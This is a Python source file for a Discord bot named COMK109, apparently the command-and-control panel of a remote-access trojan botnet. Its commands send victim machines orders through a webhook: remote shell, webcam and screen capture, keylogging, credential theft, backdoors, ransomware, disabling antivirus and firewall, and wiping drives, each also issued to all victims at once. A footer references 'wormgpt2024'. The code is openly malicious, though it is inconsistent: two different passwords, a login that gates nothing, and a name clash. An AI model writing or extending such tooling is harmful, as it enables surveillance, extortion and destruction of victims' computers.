import discord
from discord.ext import commands
import requests
import json
import os
import subprocess
import threading
import time
import base64
import datetime
import random

BOT_TOKEN = "YOUR_DISCORD_BOT_TOKEN_HERE"
CHANNEL_ID = YOUR_CHANNEL_ID_HERE
WEBHOOK_URL = "https://discord.com/api/webhooks/...."
LOG_CHANNEL = YOUR_LOG_CHANNEL_ID_HERE

bot = commands.Bot(command_prefix="!", intents=discord.Intents.all())
victims = {}
command_history = []

@bot.event
async def on_ready():
    print(f"COMK109 Online: {bot.user}")
    await bot.change_presence(activity=discord.Activity(type=discord.ActivityType.watching, name=f"{len(victims)} Victims"))
    channel = bot.get_channel(LOG_CHANNEL)
    if channel:
        await channel.send("109 Bot Online\nReady to control victims")

@bot.event
async def on_message(message):
    if message.author == bot.user:
        return
    if message.content.startswith("!"):
        await bot.process_commands(message)

@bot.command()
async def login(ctx, password=None):
    if password == "109ontop":
        await ctx.send("Authentication Success")
    else:
        await ctx.send("Authentication Failed")

@bot.command()
async def status(ctx):
    embed = discord.Embed(title="COMK109 Status", color=0xff0000)
    embed.add_field(name="Bot Status", value="Online", inline=True)
    embed.add_field(name="Victims", value=f"{len(victims)}", inline=True)
    embed.add_field(name="Commands", value=f"{len(command_history)}", inline=True)
    embed.add_field(name="Uptime", value=f"{str(datetime.timedelta(seconds=int(time.time()-start_time)))}", inline=True)
    embed.set_footer(text="109 v8.0")
    await ctx.send(embed=embed)

@bot.command()
async def victims(ctx):
    if not victims:
        await ctx.send("No victims")
        return
    embed = discord.Embed(title="Victims", color=0x00ff00)
    for ip, data in victims.items():
        embed.add_field(name=data.get('hostname', 'Unknown'), value=f"IP: {ip}\nUser: {data.get('user', 'Unknown')}", inline=False)
    await ctx.send(embed=embed)

@bot.command()
async def info(ctx, ip=None):
    if not ip:
        await ctx.send("Usage: !info <ip>")
        return
    if ip not in victims:
        await ctx.send(f"Victim {ip} not found")
        return
    data = victims[ip]
    embed = discord.Embed(title=f"Victim Info - {ip}", color=0x00ff00)
    embed.add_field(name="Hostname", value=data.get('hostname', 'Unknown'), inline=True)
    embed.add_field(name="User", value=data.get('user', 'Unknown'), inline=True)
    embed.add_field(name="OS", value=data.get('os', 'Unknown'), inline=True)
    embed.add_field(name="CPU", value=data.get('cpu', 'Unknown'), inline=True)
    embed.add_field(name="RAM", value=data.get('ram', 'Unknown'), inline=True)
    await ctx.send(embed=embed)

@bot.command()
async def shell(ctx, ip=None, *, cmd=None):
    if not ip or not cmd:
        await ctx.send("Usage: !shell <ip> <command>")
        return
    await ctx.send(f"Executing on {ip}: `{cmd}`")
    requests.post(WEBHOOK_URL, json={"content": f"SHELL|{ip}|{cmd}"})
    command_history.append(f"shell {ip} {cmd}")

@bot.command()
async def screenshot(ctx, ip=None):
    if not ip:
        await ctx.send("Usage: !screenshot <ip>")
        return
    await ctx.send(f"Screenshot {ip}")
    requests.post(WEBHOOK_URL, json={"content": f"SCREENSHOT|{ip}"})

@bot.command()
async def webcam(ctx, ip=None):
    if not ip:
        await ctx.send("Usage: !webcam <ip>")
        return
    await ctx.send(f"Webcam {ip}")
    requests.post(WEBHOOK_URL, json={"content": f"WEBCAM|{ip}"})

@bot.command()
async def download(ctx, ip=None, filepath=None):
    if not ip or not filepath:
        await ctx.send("Usage: !download <ip> <filepath>")
        return
    await ctx.send(f"Downloading {filepath} from {ip}")
    requests.post(WEBHOOK_URL, json={"content": f"DOWNLOAD|{ip}|{filepath}"})

@bot.command()
async def upload(ctx, ip=None, filepath=None):
    if not ip or not filepath:
        await ctx.send("Usage: !upload <ip> <filepath>")
        return
    await ctx.send(f"Uploading to {ip}: {filepath}")
    requests.post(WEBHOOK_URL, json={"content": f"UPLOAD|{ip}|{filepath}"})

@bot.command()
async def keylog(ctx, ip=None):
    if not ip:
        await ctx.send("Usage: !keylog <ip>")
        return
    await ctx.send(f"Keylog {ip}")
    requests.post(WEBHOOK_URL, json={"content": f"KEYLOG|{ip}"})

@bot.command()
async def lock(ctx, ip=None):
    if not ip:
        await ctx.send("Usage: !lock <ip>")
        return
    await ctx.send(f"Locking {ip}")
    requests.post(WEBHOOK_URL, json={"content": f"LOCK|{ip}"})

@bot.command()
async def shutdown(ctx, ip=None):
    if not ip:
        await ctx.send("Usage: !shutdown <ip>")
        return
    await ctx.send(f"Shutdown {ip}")
    requests.post(WEBHOOK_URL, json={"content": f"SHUTDOWN|{ip}"})

@bot.command()
async def restart(ctx, ip=None):
    if not ip:
        await ctx.send("Usage: !restart <ip>")
        return
    await ctx.send(f"Restart {ip}")
    requests.post(WEBHOOK_URL, json={"content": f"RESTART|{ip}"})

@bot.command()
async def bsod(ctx, ip=None):
    if not ip:
        await ctx.send("Usage: !bsod <ip>")
        return
    await ctx.send(f"BSOD {ip}")
    requests.post(WEBHOOK_URL, json={"content": f"BSOD|{ip}"})

@bot.command()
async def deleteall(ctx, ip=None):
    if not ip:
        await ctx.send("Usage: !deleteall <ip>")
        return
    await ctx.send(f"Delete all {ip}")
    requests.post(WEBHOOK_URL, json={"content": f"DELETEALL|{ip}"})

@bot.command()
async def ransomware(ctx, ip=None):
    if not ip:
        await ctx.send("Usage: !ransomware <ip>")
        return
    await ctx.send(f"Ransomware {ip}")
    requests.post(WEBHOOK_URL, json={"content": f"RANSOMWARE|{ip}"})

@bot.command()
async def destroy(ctx, ip=None):
    if not ip:
        await ctx.send("Usage: !destroy <ip>")
        return
    await ctx.send(f"Destroy {ip}")
    requests.post(WEBHOOK_URL, json={"content": f"DESTROY|{ip}"})

@bot.command()
async def destroywindows(ctx, ip=None):
    if not ip:
        await ctx.send("Usage: !destroywindows <ip>")
        return
    await ctx.send(f"Destroy Windows {ip}")
    requests.post(WEBHOOK_URL, json={"content": f"DESTROYWINDOWS|{ip}"})

@bot.command()
async def creds(ctx, ip=None):
    if not ip:
        await ctx.send("Usage: !creds <ip>")
        return
    await ctx.send(f"Creds {ip}")
    requests.post(WEBHOOK_URL, json={"content": f"CREDS|{ip}"})

@bot.command()
async def rdp(ctx, ip=None):
    if not ip:
        await ctx.send("Usage: !rdp <ip>")
        return
    await ctx.send(f"RDP {ip}")
    requests.post(WEBHOOK_URL, json={"content": f"RDP|{ip}"})

@bot.command()
async def backdoor(ctx, ip=None):
    if not ip:
        await ctx.send("Usage: !backdoor <ip>")
        return
    await ctx.send(f"Backdoor {ip}")
    requests.post(WEBHOOK_URL, json={"content": f"BACKDOOR|{ip}"})

@bot.command()
async def record(ctx, ip=None, seconds=10):
    if not ip:
        await ctx.send("Usage: !record <ip> [seconds]")
        return
    await ctx.send(f"Record {ip} {seconds}s")
    requests.post(WEBHOOK_URL, json={"content": f"RECORD|{ip}|{seconds}"})

@bot.command()
async def mute(ctx, ip=None):
    if not ip:
        await ctx.send("Usage: !mute <ip>")
        return
    await ctx.send(f"Mute {ip}")
    requests.post(WEBHOOK_URL, json={"content": f"MUTE|{ip}"})

@bot.command()
async def unmute(ctx, ip=None):
    if not ip:
        await ctx.send("Usage: !unmute <ip>")
        return
    await ctx.send(f"Unmute {ip}")
    requests.post(WEBHOOK_URL, json={"content": f"UNMUTE|{ip}"})

@bot.command()
async def volume(ctx, ip=None, level=None):
    if not ip or not level:
        await ctx.send("Usage: !volume <ip> <0-100>")
        return
    await ctx.send(f"Volume {ip} {level}%")
    requests.post(WEBHOOK_URL, json={"content": f"VOLUME|{ip}|{level}"})

@bot.command()
async def openapp(ctx, ip=None, *, app=None):
    if not ip or not app:
        await ctx.send("Usage: !openapp <ip> <app>")
        return
    await ctx.send(f"Open {app} on {ip}")
    requests.post(WEBHOOK_URL, json={"content": f"OPEN|{ip}|{app}"})

@bot.command()
async def killapp(ctx, ip=None, *, app=None):
    if not ip or not app:
        await ctx.send("Usage: !killapp <ip> <app>")
        return
    await ctx.send(f"Kill {app} on {ip}")
    requests.post(WEBHOOK_URL, json={"content": f"KILL|{ip}|{app}"})

@bot.command()
async def disableav(ctx, ip=None):
    if not ip:
        await ctx.send("Usage: !disableav <ip>")
        return
    await ctx.send(f"Disable AV {ip}")
    requests.post(WEBHOOK_URL, json={"content": f"DISABLEAV|{ip}"})

@bot.command()
async def blocktaskmgr(ctx, ip=None):
    if not ip:
        await ctx.send("Usage: !blocktaskmgr <ip>")
        return
    await ctx.send(f"Block Task Manager {ip}")
    requests.post(WEBHOOK_URL, json={"content": f"BLOCKTASKMGR|{ip}"})

@bot.command()
async def disablekb(ctx, ip=None):
    if not ip:
        await ctx.send("Usage: !disablekb <ip>")
        return
    await ctx.send(f"Disable Keyboard {ip}")
    requests.post(WEBHOOK_URL, json={"content": f"DISABLEKB|{ip}"})

@bot.command()
async def enablekb(ctx, ip=None):
    if not ip:
        await ctx.send("Usage: !enablekb <ip>")
        return
    await ctx.send(f"Enable Keyboard {ip}")
    requests.post(WEBHOOK_URL, json={"content": f"ENABLEKB|{ip}"})

@bot.command()
async def disablemouse(ctx, ip=None):
    if not ip:
        await ctx.send("Usage: !disablemouse <ip>")
        return
    await ctx.send(f"Disable Mouse {ip}")
    requests.post(WEBHOOK_URL, json={"content": f"DISABLEMOUSE|{ip}"})

@bot.command()
async def enablemouse(ctx, ip=None):
    if not ip:
        await ctx.send("Usage: !enablemouse <ip>")
        return
    await ctx.send(f"Enable Mouse {ip}")
    requests.post(WEBHOOK_URL, json={"content": f"ENABLEMOUSE|{ip}"})

@bot.command()
async def broadcast(ctx, *, command):
    await ctx.send(f"Broadcast: `{command}`")
    requests.post(WEBHOOK_URL, json={"content": f"BROADCAST:{command}"})

@bot.command()
async def history(ctx):
    if not command_history:
        await ctx.send("No history")
        return
    embed = discord.Embed(title="Command History", color=0x00ff00)
    for i, cmd in enumerate(command_history[-20:]):
        embed.add_field(name=f"{i+1}", value=cmd, inline=False)
    await ctx.send(embed=embed)

@bot.command()
async def clearhistory(ctx):
    command_history.clear()
    await ctx.send("History cleared")

@bot.command()
async def wipe(ctx, ip=None):
    if not ip:
        await ctx.send("Usage: !wipe <ip>")
        return
    await ctx.send(f"Wipe {ip}")
    requests.post(WEBHOOK_URL, json={"content": f"WIPE|{ip}"})

@bot.command()
async def formatdrive(ctx, ip=None, drive="C:"):
    if not ip:
        await ctx.send("Usage: !formatdrive <ip> [drive]")
        return
    await ctx.send(f"Format {drive} on {ip}")
    requests.post(WEBHOOK_URL, json={"content": f"FORMATDRIVE|{ip}|{drive}"})

@bot.command()
async def network(ctx, ip=None):
    if not ip:
        await ctx.send("Usage: !network <ip>")
        return
    await ctx.send(f"Network {ip}")
    requests.post(WEBHOOK_URL, json={"content": f"NETWORK|{ip}"})

@bot.command()
async def processes(ctx, ip=None):
    if not ip:
        await ctx.send("Usage: !processes <ip>")
        return
    await ctx.send(f"Processes {ip}")
    requests.post(WEBHOOK_URL, json={"content": f"PROCESSES|{ip}"})

@bot.command()
async def services(ctx, ip=None):
    if not ip:
        await ctx.send("Usage: !services <ip>")
        return
    await ctx.send(f"Services {ip}")
    requests.post(WEBHOOK_URL, json={"content": f"SERVICES|{ip}"})

@bot.command()
async def registry(ctx, ip=None, key=None):
    if not ip or not key:
        await ctx.send("Usage: !registry <ip> <key>")
        return
    await ctx.send(f"Registry {ip} {key}")
    requests.post(WEBHOOK_URL, json={"content": f"REGISTRY|{ip}|{key}"})

@bot.command()
async def firewall(ctx, ip=None):
    if not ip:
        await ctx.send("Usage: !firewall <ip>")
        return
    await ctx.send(f"Firewall {ip}")
    requests.post(WEBHOOK_URL, json={"content": f"FIREWALL|{ip}"})

@bot.command()
async def disablefirewall(ctx, ip=None):
    if not ip:
        await ctx.send("Usage: !disablefirewall <ip>")
        return
    await ctx.send(f"Disable Firewall {ip}")
    requests.post(WEBHOOK_URL, json={"content": f"DISABLEFIREWALL|{ip}"})

@bot.command()
async def ports(ctx, ip=None):
    if not ip:
        await ctx.send("Usage: !ports <ip>")
        return
    await ctx.send(f"Ports {ip}")
    requests.post(WEBHOOK_URL, json={"content": f"PORTS|{ip}"})

@bot.command()
async def ping(ctx, ip=None):
    if not ip:
        await ctx.send("Usage: !ping <ip>")
        return
    await ctx.send(f"Ping {ip}")
    requests.post(WEBHOOK_URL, json={"content": f"PING|{ip}"})

@bot.command()
async def dns(ctx, ip=None):
    if not ip:
        await ctx.send("Usage: !dns <ip>")
        return
    await ctx.send(f"DNS {ip}")
    requests.post(WEBHOOK_URL, json={"content": f"DNS|{ip}"})

@bot.command()
async def tasklist(ctx, ip=None):
    if not ip:
        await ctx.send("Usage: !tasklist <ip>")
        return
    await ctx.send(f"Tasklist {ip}")
    requests.post(WEBHOOK_URL, json={"content": f"TASKLIST|{ip}"})

@bot.command()
async def killpid(ctx, ip=None, pid=None):
    if not ip or not pid:
        await ctx.send("Usage: !killpid <ip> <pid>")
        return
    await ctx.send(f"Kill PID {pid} on {ip}")
    requests.post(WEBHOOK_URL, json={"content": f"KILLPID|{ip}|{pid}"})

@bot.command()
async def startservice(ctx, ip=None, service=None):
    if not ip or not service:
        await ctx.send("Usage: !startservice <ip> <service>")
        return
    await ctx.send(f"Start {service} on {ip}")
    requests.post(WEBHOOK_URL, json={"content": f"STARTSERVICE|{ip}|{service}"})

@bot.command()
async def stopservice(ctx, ip=None, service=None):
    if not ip or not service:
        await ctx.send("Usage: !stopservice <ip> <service>")
        return
    await ctx.send(f"Stop {service} on {ip}")
    requests.post(WEBHOOK_URL, json={"content": f"STOPSERVICE|{ip}|{service}"})

@bot.command()
async def whoami(ctx, ip=None):
    if not ip:
        await ctx.send("Usage: !whoami <ip>")
        return
    await ctx.send(f"Whoami {ip}")
    requests.post(WEBHOOK_URL, json={"content": f"WHOAMI|{ip}"})

@bot.command()
async def systeminfo(ctx, ip=None):
    if not ip:
        await ctx.send("Usage: !systeminfo <ip>")
        return
    await ctx.send(f"Systeminfo {ip}")
    requests.post(WEBHOOK_URL, json={"content": f"SYSTEMINFO|{ip}"})

@bot.command()
async def screenshotall(ctx):
    await ctx.send("Screenshot all")
    requests.post(WEBHOOK_URL, json={"content": "SCREENSHOTALL"})

@bot.command()
async def shutdownall(ctx):
    await ctx.send("Shutdown all")
    requests.post(WEBHOOK_URL, json={"content": "SHUTDOWNALL"})

@bot.command()
async def restartall(ctx):
    await ctx.send("Restart all")
    requests.post(WEBHOOK_URL, json={"content": "RESTARTALL"})

@bot.command()
async def destroyall(ctx):
    await ctx.send("Destroy all")
    requests.post(WEBHOOK_URL, json={"content": "DESTROYALL"})

@bot.command()
async def ransomwareall(ctx):
    await ctx.send("Ransomware all")
    requests.post(WEBHOOK_URL, json={"content": "RANSOMWAREALL"})

@bot.command()
async def destroywindowsall(ctx):
    await ctx.send("Destroy Windows all")
    requests.post(WEBHOOK_URL, json={"content": "DESTROYWINDOWSALL"})

@bot.command()
async def helpme(ctx):
    embed = discord.Embed(title="COMK109 Commands v8.0", color=0xff0000)
    embed.add_field(name="AUTH", value="!login <pass>", inline=False)
    embed.add_field(name="STATUS", value="!status\n!victims\n!info <ip>\n!history", inline=False)
    embed.add_field(name="SYSTEM", value="!shell <ip> <cmd>\n!shutdown <ip>\n!restart <ip>\n!bsod <ip>\n!lock <ip>", inline=False)
    embed.add_field(name="MONITOR", value="!screenshot <ip>\n!webcam <ip>\n!record <ip> [sec]\n!keylog <ip>", inline=False)
    embed.add_field(name="FILES", value="!download <ip> <file>\n!upload <ip> <file>\n!deleteall <ip>", inline=False)
    embed.add_field(name="DESTROY", value="!destroywindows <ip>\n!destroy <ip>\n!wipe <ip>\n!formatdrive <ip> [drive]", inline=False)
    embed.add_field(name="CREDS", value="!creds <ip>\n!rdp <ip>\n!backdoor <ip>", inline=False)
    embed.add_field(name="APPS", value="!openapp <ip> <app>\n!killapp <ip> <app>\n!disableav <ip>", inline=False)
    embed.add_field(name="INPUT", value="!disablekb <ip>\n!enablekb <ip>\n!disablemouse <ip>\n!enablemouse <ip>", inline=False)
    embed.add_field(name="VOLUME", value="!mute <ip>\n!unmute <ip>\n!volume <ip> <0-100>", inline=False)
    embed.add_field(name="NETWORK", value="!network <ip>\n!ports <ip>\n!ping <ip>\n!dns <ip>", inline=False)
    embed.add_field(name="SERVICES", value="!services <ip>\n!startservice <ip> <service>\n!stopservice <ip> <service>", inline=False)
    embed.add_field(name="TASKS", value="!tasklist <ip>\n!killpid <ip> <pid>", inline=False)
    embed.add_field(name="ALL", value="!screenshotall\n!shutdownall\n!restartall\n!destroyall\n!ransomwareall\n!destroywindowsall", inline=False)
    embed.add_field(name="BROADCAST", value="!broadcast <cmd>", inline=False)
    embed.add_field(name="SECURITY", value="!blocktaskmgr <ip>\n!firewall <ip>\n!disablefirewall <ip>", inline=False)
    embed.set_footer(text="!login wormgpt2024 first")
    await ctx.send(embed=embed)

start_time = time.time()
bot.run(BOT_TOKEN)
